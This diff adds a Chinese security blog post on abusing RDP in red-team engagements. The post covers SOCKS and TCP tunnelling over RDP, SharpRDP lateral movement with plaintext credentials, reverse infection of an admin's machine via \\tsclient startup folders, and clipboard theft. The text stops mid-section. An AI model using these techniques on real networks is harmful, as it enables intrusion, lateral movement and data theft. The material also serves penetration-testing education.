@@ -1,0 +1,759 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>红蓝对抗中 RDP 协议的利用 - Geekby&#39;s Blog</title><meta name="Description" content="红蓝对抗中 RDP 协议的利用思路整理"><meta property="og:title" content="红蓝对抗中 RDP 协议的利用" />
+<meta property="og:description" content="红蓝对抗中 RDP 协议的利用思路整理" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.geekby.site/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-01-22T09:12:00+08:00" />
+<meta property="article:modified_time" content="2021-01-22T09:12:00+08:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="红蓝对抗中 RDP 协议的利用"/>
+<meta name="twitter:description" content="红蓝对抗中 RDP 协议的利用思路整理"/>
+<meta name="application-name" content="Geekby&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="Geekby&#39;s Blog"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://www.geekby.site/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/" /><link rel="prev" href="https://www.geekby.site/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/" /><link rel="next" href="https://www.geekby.site/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "红蓝对抗中 RDP 协议的利用",
+        "inLanguage": "zh-cn",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/www.geekby.site\/2021\/01\/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8\/"
+        },"image": ["https:\/\/www.geekby.site\/logo.png"],"genre": "posts","keywords": "渗透测试, RDP","wordcount":  804 ,
+        "url": "https:\/\/www.geekby.site\/2021\/01\/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8\/","datePublished": "2021-01-22T09:12:00+08:00","dateModified": "2021-01-22T09:12:00+08:00","publisher": {
+            "@type": "Organization",
+            "name": "Geekby","logo": {
+                    "@type": "ImageObject",
+                    "url": "https:\/\/www.geekby.site\/images\/avatar.png",
+                    "width":  358 ,
+                    "height":  330 
+                }},"author": {
+                "@type": "Person",
+                "name": "Geekby"
+            },"description": "红蓝对抗中 RDP 协议的利用思路整理"
+    }
+    </script></head>
+    <body header-desktop="" header-mobile=""><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Geekby&#39;s Blog">Geekby&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/" title="文章"><i class="fas fa-inbox"></i> 文章 </a><a class="menu-item" href="/tags/" title="标签"><i class="fas fa-tags"></i> 标签 </a><a class="menu-item" href="/categories/" title="分类"><i class="fas fa-sort-amount-up-alt"></i> 分类 </a><a class="menu-item" href="/about/" title="关于"><i class="far fa-address-card"></i> 关于 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="输入关键字" id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Geekby&#39;s Blog">Geekby&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="输入关键字" id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="文章"><i class="fas fa-inbox"></i>文章</a><a class="menu-item" href="/tags/" title="标签"><i class="fas fa-tags"></i>标签</a><a class="menu-item" href="/categories/" title="分类"><i class="fas fa-sort-amount-up-alt"></i>分类</a><a class="menu-item" href="/about/" title="关于"><i class="far fa-address-card"></i>关于</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">红蓝对抗中 RDP 协议的利用</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Geekby</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><i class="far fa-folder fa-fw"></i>渗透测试</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-01-22">2021-01-22</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 804 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 4 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#1-socksoverrdp">1 SocksOverRDP</a>
+      <ul>
+        <li><a href="#11-工具介绍">1.1 工具介绍</a></li>
+        <li><a href="#12-工具测试">1.2 工具测试</a>
+          <ul>
+            <li><a href="#121-客户端">1.2.1 客户端</a></li>
+            <li><a href="#122-服务端">1.2.2 服务端</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#2-rdp-to-tcp">2 RDP to TCP</a>
+      <ul>
+        <li><a href="#21-工具介绍">2.1 工具介绍</a></li>
+        <li><a href="#22-工具测试">2.2 工具测试</a>
+          <ul>
+            <li><a href="#221-下载并编译rdp2tcp">2.2.1 下载并编译rdp2tcp</a></li>
+            <li><a href="#222-使用-xfreerdp-连接远程桌面并建立通道">2.2.2 使用 xfreerdp 连接远程桌面并建立通道</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#3-利用-rdp-横向移动">3 利用 RDP 横向移动</a>
+      <ul>
+        <li><a href="#31-测试">3.1 测试</a></li>
+        <li><a href="#32-场景">3.2 场景</a></li>
+      </ul>
+    </li>
+    <li><a href="#4-rdp-挂盘反打">4 RDP 挂盘反打</a>
+      <ul>
+        <li><a href="#41-原理">4.1 原理</a></li>
+        <li><a href="#42-利用">4.2 利用</a></li>
+        <li><a href="#43-限制条件">4.3 限制条件</a></li>
+      </ul>
+    </li>
+    <li><a href="#5-剪切板利用方法">5 剪切板利用方法</a>
+      <ul>
+        <li><a href="#51-剪切板窃取">5.1 剪切板窃取</a>
+          <ul>
+            <li><a href="#511-原理">5.1.1 原理</a></li>
+            <li><a href="#512-利用">5.1.2 利用</a></li>
+          </ul>
+        </li>
+        <li><a href="#52-剪切板传输恶意文件">5.2 剪切板传输恶意文件</a>
+          <ul>
+            <li><a href="#521-原理">5.2.1 原理</a></li>
+            <li><a href="#522-利用">5.2.2 利用</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#6-rdp-thief">6 RDP Thief</a>
+      <ul>
+        <li><a href="#61-获取连接历史记录">6.1 获取连接历史记录</a></li>
+        <li><a href="#62-破解-rdp-连接凭证">6.2 破解 RDP 连接凭证</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="红蓝对抗中-rdp-协议的利用">红蓝对抗中 RDP 协议的利用</h1>
+<h2 id="1-socksoverrdp">1 SocksOverRDP</h2>
+<h3 id="11-工具介绍">1.1 工具介绍</h3>
+<p>当防火墙规则配置为：只有 tcp/udp 3389 端口可以进行通信时，可以利用 RDP 协议，建立 Socks 通道。应用场景较为极端。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210122100331.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210122100331.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210122100331.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210122100331.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210122100331.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210122100331.png-water_print" /></p>
+<p>工具地址：<a href="https://github.com/nccgroup/SocksOverRDP" target="_blank" rel="noopener noreffer">https://github.com/nccgroup/SocksOverRDP</a></p>
+<p>此工具在 RDP 协议的基础上实现了 Socks 代理功能。 就像 SSH 的 <code>-D</code> 参数一样，在连接后，利用 RDP 协议实现代理功能。</p>
+<p>该工具包含两个部分：</p>
+<ul>
+<li><code>.dll</code>，需要在客户端上进行注册，并在每次运行时将其加载到远程桌面客户端的上下文运行环境中。</li>
+<li><code>.exe</code>，它是服务端组件，需要复制到服务器并执行。无需安装，无需配置。</li>
+</ul>
+<p>在远程桌面连接的服务器端执行 .exe 时，它会通过动态虚拟通道（RDP 协议的特性）连接回客户端，并在客户端启动 SOCKS 代理。该代理默认情况下侦听 <code>127.0.0.1:1080</code>，可以在浏览器或工具中将其配置为代理。</p>
+<div class="details admonition info open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-info-circle fa-fw"></i>信息<i class="details-icon fas fa-angle-right fa-fw"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">服务器上的程序不需要服务器端的任何特殊特权，还允许低特权用户打开虚拟通道并通过连接进行代理。</div>
+        </div>
+    </div>
+<h3 id="12-工具测试">1.2 工具测试</h3>
+<h4 id="121-客户端">1.2.1 客户端</h4>
+<p><code>.dll</code> 需要放置在客户端计算机上的任何目录中，为了方便使用，可以该文件复制到 <code>％SYSROOT％\system32\</code> 或 <code>％SYSROOT％\SysWoW64\</code> 环境变量下。</p>
+<p>使用以下命令进行安装注册该 DLL：</p>
+<p><code>regsvr32.exe SocksOverRDP-Plugin.dll</code></p>
+<p>取消注册：</p>
+<p><code>regsvr32.exe /u SocksOverRDP-Plugin.dll</code></p>
+<p>在 RDP Client 中启动 <code>mstsc.exe </code>时可以看到如下提示：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210122102022.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210122102022.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210122102022.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210122102022.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210122102022.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210122102022.png-water_print" /></p>
+<h4 id="122-服务端">1.2.2 服务端</h4>
+<p>直接执行：<code>SocksOverRDP-Server.exe</code> 即可</p>
+<h2 id="2-rdp-to-tcp">2 RDP to TCP</h2>
+<p>使用场景仍然是：由于防火墙的设置，只能连接一台 Windows 服务器的远程桌面，那么如何以这台 Windows 服务器为跳板进入内网</p>
+<h3 id="21-工具介绍">2.1 工具介绍</h3>
+<p>工具地址：<a href="https://github.com/V-E-O/rdp2tcp" target="_blank" rel="noopener noreffer">https://github.com/V-E-O/rdp2tcp</a></p>
+<p>工具原理：使用 RDP 虚拟通道功能来复用端口</p>
+<p>可用的功能：</p>
+<ul>
+<li>正向 TCP 端口转发</li>
+<li>反向 TCP 端口转发</li>
+<li>处理标准输入/输出转发</li>
+<li>SOCKS5 代理</li>
+</ul>
+<h3 id="22-工具测试">2.2 工具测试</h3>
+<h4 id="221-下载并编译rdp2tcp">2.2.1 下载并编译rdp2tcp</h4>
+<ul>
+<li>安装 mingw-w64
+<ul>
+<li><code>apt-get install mingw-w64</code></li>
+</ul>
+</li>
+<li>下载 rdp2tcp
+<ul>
+<li><code>git clone https://github.com/V-E-O/rdp2tcp.git</code></li>
+</ul>
+</li>
+<li>修改配置文件
+<ul>
+<li>rdp2tcp 默认不支持编译 64 位的 exe，所以这里需要修改配置文件，增加编译 64 位 exe 的配置信息</li>
+<li>修改文件<code>Makefile</code>，新的内容如下：</li>
+</ul>
+</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-makefile" data-lang="makefile"><span class="nf">all</span><span class="o">:</span> <span class="n">client</span> <span class="n">server</span>-<span class="n">mingw</span>64
+
+<span class="nf">client</span><span class="o">:</span> <span class="n">client</span>/<span class="n">rdp</span>2<span class="n">tcp</span>
+<span class="nf">client/rdp2tcp</span><span class="o">:</span>
+	make -C client
+
+<span class="c">#server-mingw32: server/rdp2tcp.exe
+</span><span class="c">#server/rdp2tcp.exe:
+</span><span class="c">#	make -C server -f Makefile.mingw32
+</span><span class="c"></span>
+<span class="nf">server-mingw64</span><span class="o">:</span> <span class="n">server</span>/<span class="n">rdp</span>2<span class="n">tcp</span>64.<span class="n">exe</span>
+<span class="nf">server/rdp2tcp64.exe</span><span class="o">:</span>
+	make -C server -f Makefile.mingw64
+
+<span class="nf">clean</span><span class="o">:</span>
+	make -C client clean
+<span class="c">#	make -C server -f Makefile.mingw32 clean
+</span><span class="c"></span>	make -C server -f Makefile.mingw64 clean
+	make -C tools clean
+</code></pre></td></tr></table>
+</div>
+</div><p>新建文件 <code>/server/Makefile.mingw64</code>，内容如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-makefile" data-lang="makefile"><span class="nv">BIN</span><span class="o">=</span>rdp2tcp64.exe
+<span class="nv">CC</span><span class="o">=</span>i686-w64-mingw32-gcc
+<span class="nv">CFLAGS</span><span class="o">=</span>-Wall -g <span class="se">\
+</span><span class="se"></span>		 -D_WIN32_WINNT<span class="o">=</span>0x0501 <span class="se">\
+</span><span class="se"></span>		 -I../common
+
+<span class="c"># -D_WIN32_WINNT=0x0501
+</span><span class="c"># -D_WIN32_WINNT=0x0501 -DDEBUG
+</span><span class="c"></span>
+<span class="nv">LDFLAGS</span><span class="o">=</span>-lwtsapi32 -lws2_32
+<span class="nv">OBJS</span><span class="o">=</span>	../common/iobuf.o <span class="se">\
+</span><span class="se"></span>	../common/print.o <span class="se">\
+</span><span class="se"></span>	../common/msgparser.o <span class="se">\
+</span><span class="se"></span>	../common/nethelper.o <span class="se">\
+</span><span class="se"></span>	../common/netaddr.o <span class="se">\
+</span><span class="se"></span>	errors.o aio.o events.o <span class="se">\
+</span><span class="se"></span>	tunnel.o channel.o process.o commands.o main.o
+
+<span class="nf">all</span><span class="o">:</span> <span class="n">clean_common</span> <span class="k">$(</span><span class="nv">BIN</span><span class="k">)</span>
+
+<span class="nf">clean_common</span><span class="o">:</span>
+	<span class="k">$(</span>MAKE<span class="k">)</span> -C ../common clean
+
+<span class="nf">$(BIN)</span><span class="o">:</span> <span class="k">$(</span><span class="nv">OBJS</span><span class="k">)</span>
+	<span class="k">$(</span>CC<span class="k">)</span> -o <span class="nv">$@</span> <span class="k">$(</span>OBJS<span class="k">)</span> <span class="k">$(</span>LDFLAGS<span class="k">)</span> 
+
+<span class="nf">%.o</span><span class="o">:</span> %.<span class="n">c</span>
+	<span class="k">$(</span>CC<span class="k">)</span> <span class="k">$(</span>CFLAGS<span class="k">)</span> -o <span class="nv">$@</span> -c $&lt;
+
+<span class="nf">clean</span><span class="o">:</span>
+	rm -f <span class="k">$(</span>OBJS<span class="k">)</span> <span class="k">$(</span>BIN<span class="k">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>编译
+<ul>
+<li><code>make</code></li>
+</ul>
+</li>
+</ul>
+<h4 id="222-使用-xfreerdp-连接远程桌面并建立通道">2.2.2 使用 xfreerdp 连接远程桌面并建立通道</h4>
+<ul>
+<li>执行 xfreerdp 并开启 TCP 重定向功能
+<ul>
+<li><code>/opt/freerdp-nightly/bin/xfreerdp /v:IP:3389 /u:user /p:passwd /cert-ignore /rdp2tcp:/root/rdp2tcp/client/rdp2tcp</code></li>
+</ul>
+</li>
+<li>将 rdp2tcp64.exe 上传至 RDP Server 并执行(不需要管理员权限)</li>
+<li>在客户端系统上启动 rdp2tcp.py
+<ul>
+<li><code>cd rdp2tcp/tools</code></li>
+<li><code>python rdp2tcp.py</code></li>
+</ul>
+</li>
+<li>添加正向端口转发(本地 445 -&gt; 192.168.112.129:445)的命令如下：
+<ul>
+<li><code>python rdp2tcp.py add forward 127.0.0.1 445 192.168.112.129 445</code></li>
+</ul>
+</li>
+</ul>
+<h2 id="3-利用-rdp-横向移动">3 利用 RDP 横向移动</h2>
+<h3 id="31-测试">3.1 测试</h3>
+<p>本节介绍的是如何在不通过 GUI 客户端和 Socks 代理的情况下，基于 RDP 协议进行横向移动。</p>
+<p>Windows 下 mstscax.dll 库可以执行任何 RDP 功能，此 DLL 是 Microsoft 终端服务的 ActiveX COM 库。通过利用此 DLL，测试人员可以创建控制台应用程序，该控制台应用程序通过 RDP 执行经过身份验证的远程命令执行，而无需 GUI 客户端或 SOCKS 代理。</p>
+<ul>
+<li>在 Cobalt Strike 中执行：</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210122111412.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210122111412.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210122111412.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210122111412.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210122111412.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210122111412.png-water_print" /></p>
+<ul>
+<li>直接执行命令：</li>
+</ul>
+<p><code>SharpRDP.exe computername=dc01 command=calc username=offense\administrator password=123456</code></p>
+<p>有两种身份验证方法，一种是提供纯文本凭据（如上），另一种是使用受限管理模式的当前用户上下文。受限管理模式是一种 Windows 保护机制，它要求执行网络类型登录而不是交互式登录，即 PTH。</p>
+<h3 id="32-场景">3.2 场景</h3>
+<p>有时在某些情况下，RDP 是执行横向移动技术的首选方法，但使用传统的 RDP 客户端 GUI 可能很困难。因此，可以使用上述方法，将命令执行过程隐藏在 RDP 协议中。</p>
+<p>其次，可以在没有系统本地管理特权但对系统拥有 RDP 权限的情况下利用 RDP 进行横向移动，可以利用 BloodHound 进行信息收集。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210122113325.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210122113325.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210122113325.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210122113325.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210122113325.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210122113325.png-water_print" /></p>
+<h2 id="4-rdp-挂盘反打">4 RDP 挂盘反打</h2>
+<p>利用 挂盘监控 + 注入启动项 进行攻击</p>
+<h3 id="41-原理">4.1 原理</h3>
+<p>tsclient 是通过远程桌面连接到远程计算机时，在远程计算机「网上邻居」中出现的一个机器名，实际为远程计算机分配给本机的名称。</p>
+<p>通过 <code>\\tsclient\盘符 </code>可以在远程计算机上访问本机。其访问方式类似于使用 smb 进行文件传输，虽然本质上都是 smb 协议，但是使用 tsclient 无需身份认证，因此可以直接将通过预制手段，使用 tsclient 反向感染。</p>
+<h3 id="42-利用">4.2 利用</h3>
+<p>通常情况下，tsclient 的利用思路较为简单，通过文件传输将恶意程序脚本写入用户的启动（startup）文件夹，当机器重启时，就会执行恶意程序脚本。</p>
+<p>工具：<a href="https://github.com/mdsecactivebreach/RDPInception/" target="_blank" rel="noopener noreffer">https://github.com/mdsecactivebreach/RDPInception/</a></p>
+<h3 id="43-限制条件">4.3 限制条件</h3>
+<ol>
+<li>mstsc 需要开启驱动器 C 盘，但是默认情况下 mstsc 是不开启磁盘共享功能的。必须要手工开启，如图所示：</li>
+</ol>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210122113806.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210122113806.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210122113806.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210122113806.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210122113806.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210122113806.png-water_print" /></p>
+<ol start="2">
+<li>当开启 RDP 远程访问时，只有远程登录的用户可以访问 tsclient。其他用户无法访问，包括使用 runas 也无法访问。</li>
+</ol>
+<p>虽然限制条件较多，但在实际环境中，很多运维人员为了方便操作，通常会挂载磁盘，因此这一方法并非全然无用，需要根据实际情况判断。猥琐一些的思路：在脚本找不到挂载磁盘的情况下，直接结束 rdpclip.exe 使管理员无法使用剪切板功能，迫使管理员在不清楚原因的状况下，直接重新挂载上磁盘操作。</p>
+<p>最后，不同于 smb 上传文件后使用计划任务启动，由于不知道被感染的机器用户身份，因此只能依托于启动项开机自启动。因此，该攻击方式对服务器攻击效果较弱。</p>
+<h2 id="5-剪切板利用方法">5 剪切板利用方法</h2>
+<p>除了利用文件传输以外，其实还可以尝试利用剪切板劫持的方法进行反向攻击。</p>
+<h3 id="51-剪切板窃取">5.1 剪切板窃取</h3>
+<h4 id="511-原理">5.1.1 原理</h4>
+<p>在使用 mstsc 进行远程桌面的时候，会启动一个叫 rdpclip.exe 的进程，该进程的功能是同步服务端与客户端的剪贴板。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210122114139.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210122114139.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210122114139.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210122114139.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210122114139.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210122114139.png-water_print" /></p>
+<p>而这个进程是一个十分有用的进程，如上文提到的，如果直接结束该进程，那么在服务端(远程机器)上将某些数据拷贝到客户端（本地机器）上时，就会发现剪贴板失效，无法复制。</p>
+<p>由于启动该进程时，会自动同步剪切板内容，因此当目标目标机器与其他机器使用 mstsc 建立 RDP 远程连接时，就可以通过读取 rdplicp.exe 进程数据，进行剪贴板窃取，以尽可能地获取更多的信息。</p>
+<p>此外，由于该进程是后台运行的，当管理员同时用远程桌面登陆多个服务器，在其中的某一个服务器上进行复制拷贝操作时，会将数据同步到所有服务器的 rdplicp.exe 进程。</p>
+<h4 id="512-利用">5.1.2 利用</h4>
+<p>在 empire 中有一个 Get-ClipboardContents.ps1，可以用 empire 或者 coablt strike 加载该脚本。或者也可以自己编写相关脚本使用。是一个相对简单的工具。</p>
+<p>但是需要注意的是，与 tsclient 类似，同计算机的不同用户之间是无法读取的，每一个用户的 rdplicp.exe 是独立启动的。</p>
+<h3 id="52-剪切板传输恶意文件">5.2 剪切板传输恶意文件</h3>
+<p>当我们用mstsc登陆了一台服务器后，在该服务器上按下复制操作时，会产生一系列操作。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210122115716.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210122115716.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210122115716.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210122115716.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210122115716.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210122115716.png-water_print" /></p>
+<h4 id="521-原理">5.2.1 原理</h4>
+<p>在远程桌面时，使用剪切板传输一个文件的流程如下：</p>
+<p>1、在服务器上，&ldquo;复制&quot;操作会创建格式为 &ldquo;CF_HDROP&rdquo; 的剪贴板数据</p>
+<p>2、在客户端计算机中执行「粘贴」时，将触发一系列事件</p>
